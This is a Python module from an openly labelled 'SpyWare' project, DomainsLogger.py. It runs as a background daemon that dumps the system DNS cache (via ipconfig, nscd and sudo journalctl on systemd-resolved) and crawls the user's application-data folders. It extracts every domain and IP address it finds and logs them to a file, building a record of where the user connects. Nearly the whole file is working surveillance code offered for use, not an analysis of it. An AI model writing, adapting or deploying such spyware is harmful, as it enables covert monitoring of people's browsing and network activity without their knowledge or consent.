#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This file implements a SpyWare for connection destinations.
#    Copyright (C) 2021, 2022, 2023  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This file implements a SpyWare for connection destinations.

~# python3 DomainsLogger.py domainsSpy.conf

>>> from os import environ
>>> environ['domainsSpy.conf'] = 'domainsSpy.conf'
>>> from SpyWare.DomainsLogger import domainsSpy
>>> domainsSpy()                  # (using env) OR
>>> domainsSpy('domainsSpy.conf') # (using config file name) OR
>>> domainsSpy(argv=["DomainsLogger.py", "domainsSpy.conf"]) # (using argv)
"""

__version__ = "1.0.1"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This file implements a complete spyware.
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/SpyWare"

copyright = """
SpyWare  Copyright (C) 2021, 2022, 2023  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = ["Daemon", "main", "CacheDNS", "CacheAppData", "config_load"]

from os.path import join, expanduser, isdir, isfile, dirname, exists
from os import device_encoding, environ, stat, access, R_OK
from re import compile as cregex, Pattern
from typing import List, Set, Iterable
from configparser import ConfigParser
from subprocess import Popen, PIPE
from mmap import mmap, ACCESS_READ
from threading import Thread, Lock
from traceback import print_exc
from io import TextIOWrapper
from platform import system
from sys import argv, exit
from time import sleep
from glob import iglob


class CONFIGURATIONS:

    """
    This class contains configurations.
    """

    IS_WINDOWS = system() == "Windows"
    string_regex_domain: str = (
        r"([a-zA-Z0-9]([-_]?[a-zA-Z0-9]){0,62}\.)*"
        r"[a-zA-Z0-9]([-_]?[a-zA-Z0-9]){0,62}\.[a-zA-Z]{2,5}"
    ).encode()
    string_regex_ip: str = r"([0-9]{1,3}[.]){3}[0-9]{1,3}".encode()

    regex_domain: Pattern = cregex(string_regex_domain)
    regex_ip: Pattern = cregex(string_regex_ip)

    save_filename: str = "domains.txt"

    if IS_WINDOWS:
        commandes = (("ipconfig", "/displaydns"),)
        appdata_path = join(environ["APPDATA"], "..")
    else:
        commandes = (
            ("strings", "/var/cache/nscd/hosts"),
            ("sudo", "killall", "-USR1", "systemd-resolved"),
            ("sudo", "journalctl", "-u", "systemd-resolved"),
        )
        appdata_path = join(expanduser("~"), ".locals")

    interval_DNS: float = 600
    interval_appdata: float = 86400
    interval_reading_file: float = 0.5
    interval_domain: float = 0.5


def config_load(filename: str = None, argv: List[str] = argv) -> int:

    """
    This function loads the configuration using a the configuration file.
    """

    CONFIG = ConfigParser()

    default_file_name = "domainsSpy.conf"
    default_file_path = join(dirname(__file__), default_file_name)
    env_config_file = environ.get(default_file_name)
    arg_config_file = argv[1] if len(argv) == 2 else None

    if filename is not None and exists(filename):
        CONFIG.read(filename)
    elif arg_config_file is not None and exists(arg_config_file):
        CONFIG.read(arg_config_file)
    elif env_config_file and exists(env_config_file):
        CONFIG.read(env_config_file)
    elif exists(default_file_path):
        CONFIG.read(default_file_path)
    else:
        return 1

    CONFIG = CONFIG.__dict__["_sections"]
    CONFIGURATIONS.save_filename = CONFIG.get("SAVE", {}).get(
        "filename", "domains.txt"
    )
    CONFIGURATIONS.interval_DNS = float(
        CONFIG.get("TIME", {}).get("interval_dns", "600")
    )
    CONFIGURATIONS.interval_appdata = float(
        CONFIG.get("TIME", {}).get("interval_appdata", "86400")
    )
    CONFIGURATIONS.interval_reading_file = float(
        CONFIG.get("TIME", {}).get("interval_reading_file", "0.5")
    )
    CONFIGURATIONS.interval_domain = float(
        CONFIG.get("TIME", {}).get("interval_domain", "0.5")
    )
    return 0


class Daemon:

    """
    This class implements a loop to get connection destinations.
    """

    def __init__(self):
        self.interval_appdata = CONFIGURATIONS.interval_appdata
        self.interval_dns = CONFIGURATIONS.interval_DNS
        self.cacheAppData = CacheAppData()
        self.cacheDns = CacheDNS()
        self.lock = Lock()
        self.run = True

        filename = self.filename = CONFIGURATIONS.save_filename
        create_if_not_exists(filename)
        self.data_file = open(filename)
        self.data = []

    def run_CacheDns(self) -> None:

        """
        This function implements the loop to get destinations
        in DNS cache.
        """

        get_data_to_save = self.get_data_to_save
        persistent_save = self.persistent_save
        interval = self.interval_dns
        cacheDns = self.cacheDns
        research = cacheDns.research
        launch = cacheDns.launch
        counter = 0

        while self.run:
            launch()
            get_data_to_save(research())
            counter += 1

            if counter >= 3:
                persistent_save()
                counter = 0

            if self.run:
                sleep(interval)

    def run_AppData(self) -> None:

        """
        This function implements the loop to get destinations
        is Application data.
        """

        interval = self.interval_appdata
        path = CONFIGURATIONS.appdata_path
        domains_generator = self.cacheAppData.domains_generator
        get_data_to_save = self.get_data_to_save

        while self.run:
            for domains in domains_generator(path):
                get_data_to_save(domains)

            if self.run:
                sleep(interval)

    def get_data_to_save(self, domains: Set[bytes]) -> None:

        """
        This function saves domain if isn't save before.
        """

        domains = [domain + b"\n" for domain in domains]
        lock = self.lock
        lock.acquire()

        data_file = self.data_file
        data_file.seek(0)
        readline = data_file.readline

        data = readline()

        while data:
            for domain in domains:
                if domain == data:
                    domains.remove(domain)
            data = readline()

        if domains:
            self.data.extend(domains)

        lock.release()

    def persistent_save(self) -> None:

        """
        This function write IPs or domains if not in file.
        """

        lock = self.lock
        lock.acquire()
        self.data_file.close()
        filename = self.filename

        with open(filename, "ab") as file:
            file.write(b"".join(self.data))

        self.data_file = open(filename, "rb")
        self.data = []
        lock.release()


class CacheDNS:

    """
    This class gets and extract domains and IPs the DNS cache.
    """

    def __init__(self):
        self.extract_domains = CONFIGURATIONS.regex_domain.finditer
        self.extract_ip = CONFIGURATIONS.regex_ip.finditer
        self.commandes = CONFIGURATIONS.commandes
        self.process = None
        self.domains = []
        self.out = None
        self.ip = []

    def launch(self) -> None:

        """
        This function execute commands to get DNS cache.
        """

        out = self.out = []
        o_append = out.append

        errors = self.errors = []
        e_append = errors.append

        for commande in self.commandes:
            process = Popen(commande, stdout=PIPE, stderr=PIPE)
            out_, err = process.communicate()
            o_append(out_)
            if err:
                e_append(err)

        self.out = b"".join(out)

        returncode = process.returncode
        if errors or returncode:
            print(f"ExitCode: {returncode}\nError: {b''.join(errors)}")

    def research(self) -> List[bytes]:

        """
        This function extracts IPs and domains from commands line results.
        """

        return set(
            [m.group() for m in self.extract_ip(self.out)]
            + [m.group() for m in self.extract_domains(self.out)]
        )


class CacheAppData:

    """
    This class gets and extract domains and IPs from applications cache.
    """

    def __init__(self):
        self.data = None
        self.temp_data = None
        self.extract_ip = CONFIGURATIONS.regex_ip.finditer
        self.extract_domain = CONFIGURATIONS.regex_domain.finditer
        self.interval_reading_file = CONFIGURATIONS.interval_reading_file

    def domains_generator(self, directory: str) -> Iterable[List[bytes]]:

        """
        This function get recursives filenames.
        """

        interval = self.interval_reading_file
        domains_generator = self.domains_generator
        get_data = self.get_data

        for filename in iglob(join(directory, "*")):
            if isdir(filename):
                yield from domains_generator(join(directory, filename))
            elif isfile(filename):
                try:
                    yield get_data(join(directory, filename))
                except Exception:
                    print_exc()
                sleep(interval)

    def get_data(self, filename: str) -> None:

        """
        This function get domain and IP from data file.
        """

        size = stat(filename).st_size

        if access(filename, R_OK):
            file = open(filename)
        else:
            return []

        if size:
            data = mmap(file.fileno(), size, access=ACCESS_READ)
            found = [m.group() for m in self.extract_ip(data)] + [
                m.group() for m in self.extract_domain(data)
            ]
        else:
            found = []
        file.close()
        return found


def create_if_not_exists(filename: str) -> None:

    """
    This function creates file if not exists.
    """

    if not exists(filename):
        file = open(filename, "w")
        file.write("")
        file.close()


def main(config_filename: str = None, argv: List[str] = argv) -> int:

    """
    This function executes the file from the command line.
    """

    config_load(filename=config_filename, argv=argv)

    daemon = Daemon()
    thread = Thread(target=daemon.run_CacheDns)
    thread.start()
    try:
        daemon.run_AppData()
    except KeyboardInterrupt:
        daemon.run = False

    thread.join()
    return 0


if __name__ == "__main__":
    print(copyright)
    exit(main())
